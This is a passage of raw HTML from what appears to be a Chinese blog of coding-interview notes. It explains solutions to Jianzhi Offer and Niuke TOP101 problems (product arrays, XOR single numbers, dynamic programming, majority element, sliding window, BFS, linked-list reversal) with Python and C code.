class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">            tmpS = s[i-dp[i-<span class="number">1</span>]:i+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(<span class="built_in">set</span>(tmpS)) == <span class="built_in">len</span>(tmpS)):</span><br><span class="line">                dp[i] = dp[i-<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[i] = dp[i-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="built_in">len</span>(s)-<span class="number">1</span>]</span><br></pre></td></tr></table></div></figure>


        <h2 id="构建乘积数组"   >
          <a href="#构建乘积数组" class="heading-link"><i class="fas fa-link"></i></a><a href="#构建乘积数组" class="headerlink" title="构建乘积数组"></a>构建乘积数组</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021114545583.png" alt="image-20221021114545583"></p>
<p>利用两次遍历依次累乘</p>
<p>对于<code>B[i]</code>：</p>
<ul>
<li><p>第一次遍历，计算从<code>B[0]~B[i-1]</code>的乘积，结果保存在<code>B[i]</code>中</p>
<p>这时候由于<code>B[i] = B[i-1]*A[i-1]</code>，所以我们可以从B[0]依次累乘，只需要遍历一次即可。</p>
</li>
<li><p>第二次遍历，计算从<code>B[n-1]~B[i+1]</code>的乘积，最后乘上之前保存的<code>B[i]</code>即可</p>
<p>同样这时候由于<code>B[i] = B[i+1]*A[i+1]*B[i]</code>，那么我们也可以从<code>B[n-1]</code>开始依次累乘，遍历一次即可。</p>
</li>
</ul>
<p>依据该规律，两次遍历即可得出结果</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">constructArr</span>(<span class="params">self, a: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        product = <span class="number">1</span></span><br><span class="line">        b = [<span class="number">1</span>] * <span class="built_in">len</span>(a)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a)):</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">                product = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                product *= a[i-<span class="number">1</span>]</span><br><span class="line">            b[i] = product</span><br><span class="line">        product = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="built_in">len</span>(a) - <span class="number">1</span>):</span><br><span class="line">                product = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                product *= a[i+<span class="number">1</span>]</span><br><span class="line">            b[i] *= product</span><br><span class="line">        <span class="keyword">return</span> b</span><br></pre></td></tr></table></div></figure>




        <h2 id="数组中数字出现的次数"   >
          <a href="#数组中数字出现的次数" class="heading-link"><i class="fas fa-link"></i></a><a href="#数组中数字出现的次数" class="headerlink" title="数组中数字出现的次数"></a>数组中数字出现的次数</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021154510005.png" alt="image-20221021154510005"></p>
<p>如果不考虑空间复杂度，直接使用hash即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def singleNumbers(self, nums: List[int]) -&gt; List[int]:</span><br><span class="line">        dict = &#123;&#125;</span><br><span class="line">        myList = []</span><br><span class="line">        for i in nums:</span><br><span class="line">            if(i in dict.keys()):</span><br><span class="line">                dict[i] = not dict[i]</span><br><span class="line">            else:</span><br><span class="line">                dict[i] = True</span><br><span class="line">        for i in dict.keys():</span><br><span class="line">            if(dict[i] == True):</span><br><span class="line">                myList.append(i)</span><br><span class="line">        return myList</span><br><span class="line">        </span><br></pre></td></tr></table></div></figure>

<p>但是要求空间复杂度为O(1)，那么就需要进行其他方法了，参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/solution/jian-zhi-offer-56-i-shu-zu-zhong-shu-zi-tykom/" >剑指 Offer 56 - I. 数组中数字出现的次数（位运算，清晰图解） - 数组中数字出现的次数 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>提供的思路，位运算</p>
<ul>
<li>假设不同的两位数分别为<code>x,y</code></li>
<li>通过异或<code>nums</code>里所有数，求得<code>x⊕y</code>为<code>xy</code></li>
<li>假定<code>m=1</code>，通过位运算逐次循环左移并且异或<code>x⊕y</code>，求得<code>x⊕y</code>中最小为1的位。</li>
<li>由于<code>x⊕y</code>中某位<code>bit</code>为<code>1</code>，那么由于异或的特性，<code>x、y</code>各自该位的<code>bit</code>一定一个为<code>1</code>一个为<code>0</code>，基于此对<code>nums</code>进行分组</li>
<li>将该位<code>bit</code>为<code>1</code>的分为一组，为<code>0</code>的分为另一组，那么即可将<code>x、y</code>分开。同时对于其他的数字，由于各自独立成对，那么成对的数字一定会被分到同一组，之后异或之后也直接为0了。</li>
<li>然后各自两种进行异或即可得到最终的<code>x、y</code></li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">singleNumbers</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        xy = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            xy ^= i</span><br><span class="line">        m = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> (m &amp; xy == <span class="number">0</span>):</span><br><span class="line">            m &lt;&lt;= <span class="number">1</span></span><br><span class="line">        x,y = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span>(i &amp; m == <span class="number">0</span>):</span><br><span class="line">                x ^= i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                y ^= i</span><br><span class="line">        <span class="keyword">return</span> [x,y]</span><br></pre></td></tr></table></div></figure>




        <h2 id="礼物的最大价值"   >
          <a href="#礼物的最大价值" class="heading-link"><i class="fas fa-link"></i></a><a href="#礼物的最大价值" class="headerlink" title="礼物的最大价值"></a>礼物的最大价值</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021162958198.png" alt="image-20221021162958198"></p>
<p>动态规划，设<code>dp[i][j]</code>为以<code>[i,j]</code>为终点的途径的获得的最大价值礼物，则有状态转换方程如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i][j] = max(dp[i-1][j],dp[i][j-1]) + grid[i][j]</span><br></pre></td></tr></table></div></figure>

<p>初始状态：<code>dp[0][0] = grid[0][0]</code></p>
<p>同时由于可能会超出边界，所以将<code>dp</code>扩大一个长宽</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp = [[0 for i in range(len(grid[0]) + 1)] for i in range(len(grid) + 1)]</span><br></pre></td></tr></table></div></figure>

<p>同时从<code>dp[1][1]</code>开始作为计数，边界为数值为0，依据状态转换方程可得</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxValue</span>(<span class="params">self, grid: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        dp = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(grid[<span class="number">0</span>]) + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(grid) + <span class="number">1</span>)]</span><br><span class="line">        dp[<span class="number">1</span>][<span class="number">1</span>] = grid[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(grid) + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(grid[<span class="number">0</span>]) + <span class="number">1</span>):</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>]) + grid[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="built_in">len</span>(grid)][<span class="built_in">len</span>(grid[<span class="number">0</span>])]</span><br></pre></td></tr></table></div></figure>




        <h2 id="数组中出现次数超过一半的数字"   >
          <a href="#数组中出现次数超过一半的数字" class="heading-link"><i class="fas fa-link"></i></a><a href="#数组中出现次数超过一半的数字" class="headerlink" title="数组中出现次数超过一半的数字"></a>数组中出现次数超过一半的数字</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021170623491.png" alt="image-20221021170623491"></p>
<p>第一个想法就是<code>hash</code>表</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">majorityElement</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(nums) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span>(i <span class="keyword">in</span> <span class="built_in">dict</span>.keys()):</span><br><span class="line">                <span class="built_in">dict</span>[i] = <span class="built_in">dict</span>[i] + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">dict</span>[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">dict</span>[i] &gt; <span class="built_in">len</span>(nums)//<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">return</span> i</span><br></pre></td></tr></table></div></figure>

<p>第二个想法就是排序，然后取中位数即为超过数组一半的数</p>
<p>第三个参考摩尔投票法：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/shu-zu-zhong-chu-xian-ci-shu-chao-guo-yi-ban-de-shu-zi-lcof/solution/mian-shi-ti-39-shu-zu-zhong-chu-xian-ci-shu-chao-3/" >剑指 Offer 39. 数组中出现次数超过一半的数字（摩尔投票法，清晰图解） - 数组中出现次数超过一半的数字 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">majorityElement</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">sum</span> == <span class="number">0</span>):</span><br><span class="line">                x = i</span><br><span class="line">            <span class="keyword">if</span>(i != x):</span><br><span class="line">                <span class="built_in">sum</span> -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">sum</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></div></figure>


        <h2 id="和为s的连续正数序列"   >
          <a href="#和为s的连续正数序列" class="heading-link"><i class="fas fa-link"></i></a><a href="#和为s的连续正数序列" class="headerlink" title="和为s的连续正数序列"></a>和为s的连续正数序列</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221021211704786.png" alt="image-20221021211704786"></p>
<p>和求最长不重复子串一样，直接滑动窗口</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findContinuousSequence</span>(<span class="params">self, target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span></span><br><span class="line">        i,j = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        myList = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,ceil(target/<span class="number">2</span>)+<span class="number">1</span>)]</span><br><span class="line">        res = []</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="built_in">sum</span> += myList[i]</span><br><span class="line">        <span class="keyword">while</span>(j &lt; <span class="built_in">len</span>(myList)):</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">sum</span> &lt; target):</span><br><span class="line">                <span class="keyword">if</span>(j == <span class="built_in">len</span>(myList)-<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">return</span> res</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                    <span class="built_in">sum</span> += myList[j]</span><br><span class="line">            <span class="keyword">elif</span>(<span class="built_in">sum</span> == target):</span><br><span class="line">                res.append(myList[i:j+<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">if</span>(j == <span class="built_in">len</span>(myList)-<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">return</span> res</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                    <span class="built_in">sum</span> += myList[j]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">sum</span> -= myList[i]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>




        <h2 id="从上到下打印二叉树"   >
          <a href="#从上到下打印二叉树" class="heading-link"><i class="fas fa-link"></i></a><a href="#从上到下打印二叉树" class="headerlink" title="从上到下打印二叉树"></a>从上到下打印二叉树</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221024113552404.png" alt="image-20221024113552404"></p>
<p>可知BFS广度优先搜索满足要求，使用队列</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span>(<span class="params">self, root: TreeNode</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        res = []</span><br><span class="line">        q = queue.Queue()</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">bfs</span>():</span></span><br><span class="line">            <span class="keyword">if</span>(q.qsize() == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            root = q.get()</span><br><span class="line">            <span class="keyword">if</span> (root == <span class="literal">None</span>):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            res.append(root.val)</span><br><span class="line">            <span class="keyword">if</span>(root.left != <span class="literal">None</span>):</span><br><span class="line">                q.put(root.left)</span><br><span class="line">            <span class="keyword">if</span>(root.right != <span class="literal">None</span>):</span><br><span class="line">                q.put(root.right)</span><br><span class="line">            bfs()</span><br><span class="line">        q.put(root)</span><br><span class="line">        bfs()</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>

<p>去掉这个递归有点麻烦，多次判断，尝试去掉递归</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span>(<span class="params">self, root: TreeNode</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        res = []</span><br><span class="line">        q = queue.Queue()</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">bfs</span>():</span></span><br><span class="line">            <span class="keyword">while</span>(q.qsize() != <span class="number">0</span>):</span><br><span class="line">                tmpRoot = q.get()</span><br><span class="line">                res.append(tmpRoot.val)</span><br><span class="line">                <span class="keyword">if</span>(tmpRoot.left != <span class="literal">None</span>):</span><br><span class="line">                    q.put(tmpRoot.left)</span><br><span class="line">                <span class="keyword">if</span>(tmpRoot.right != <span class="literal">None</span>):</span><br><span class="line">                    q.put(tmpRoot.right)</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        q.put(root)</span><br><span class="line">        bfs()</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>




        <h1 id="牛客TOP101"   >
          <a href="#牛客TOP101" class="heading-link"><i class="fas fa-link"></i></a><a href="#牛客TOP101" class="headerlink" title="牛客TOP101"></a>牛客TOP101</h1>
      
        <h2 id="链表"   >
          <a href="#链表" class="heading-link"><i class="fas fa-link"></i></a><a href="#链表" class="headerlink" title="链表"></a>链表</h2>
      
        <h3 id="链表内指定区间反转"   >
          <a href="#链表内指定区间反转" class="heading-link"><i class="fas fa-link"></i></a><a href="#链表内指定区间反转" class="headerlink" title="链表内指定区间反转"></a>链表内指定区间反转</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104201440818.png" alt="image-20221104201440818"></p>
<p>使用<code>pre</code>、<code>cur</code>、<code>next</code>三指针进行，需要注意某些特殊条件</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">reverseBetween</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> m, <span class="keyword">int</span> n )</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">originHead</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">pre</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">cur</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">tmpHead</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">lengtHead</span> =</span> head;</span><br><span class="line">    <span class="keyword">if</span> ((n-m) &lt; <span class="number">1</span> || head==<span class="literal">NULL</span>||head-&gt;next==<span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> originHead;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (m == <span class="number">1</span>) &#123;</span><br><span class="line">        tmpHead = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; m - <span class="number">1</span> ; i ++ ) &#123;</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++ ) &#123;</span><br><span class="line">        pre = pre-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n - m + <span class="number">1</span> ; i ++) &#123;</span><br><span class="line">        next = cur-&gt;next;</span><br><span class="line">        cur-&gt;next = pre;</span><br><span class="line">        pre = cur;</span><br><span class="line">        cur = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tmpHead == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; m - <span class="number">2</span> ; i ++ ) &#123;</span><br><span class="line">            tmpHead = tmpHead-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        tmpHead-&gt;next = pre;</span><br><span class="line">        <span class="keyword">return</span> originHead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="链表中的节点每k个一组翻转"   >
          <a href="#链表中的节点每k个一组翻转" class="heading-link"><i class="fas fa-link"></i></a><a href="#链表中的节点每k个一组翻转" class="headerlink" title="链表中的节点每k个一组翻转"></a>链表中的节点每k个一组翻转</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221105090729643.png" alt="image-20221105090729643"></p>
<p>即依照索引，滑动窗口形式进行指定区间翻转，这里要记录一下翻转之前的<code>preHead</code>指针，方便在翻转之后进行连接。</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">struct ListNode<span class="operator">*</span> reverseKGroup(struct ListNode<span class="operator">*</span> head, <span class="type">int</span> k ) &#123;</span><br><span class="line">    if (k <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    struct ListNode<span class="operator">*</span> originHead <span class="operator">=</span> head;</span><br><span class="line">    struct ListNode<span class="operator">*</span> lengtHead <span class="operator">=</span> head;</span><br><span class="line">    struct ListNode<span class="operator">*</span> pre <span class="operator">=</span> head;</span><br><span class="line">    struct ListNode<span class="operator">*</span> cur <span class="operator">=</span> head;</span><br><span class="line">    struct ListNode<span class="operator">*</span> preHead;</span><br><span class="line">    struct ListNode<span class="operator">*</span> nextPreHead <span class="operator">=</span> <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="type">int</span> tmpCount;</span><br><span class="line">    <span class="type">int</span> <span class="keyword">left</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="keyword">right</span> <span class="operator">=</span> <span class="keyword">left</span> <span class="operator">+</span> k <span class="operator">-</span> <span class="number">1</span> ;</span><br><span class="line">    <span class="type">int</span> length <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    while (lengtHead <span class="operator">!=</span> <span class="keyword">NULL</span>) &#123;</span><br><span class="line">        lengtHead <span class="operator">=</span> lengtHead<span class="operator">-</span><span class="operator">&gt;</span>next;</span><br><span class="line">        length <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    while (<span class="keyword">right</span> <span class="operator">&lt;=</span> length) &#123;</span><br><span class="line">        tmpCount <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        while (tmpCount <span class="operator">&lt;</span> k) &#123;</span><br><span class="line">            pre <span class="operator">=</span> 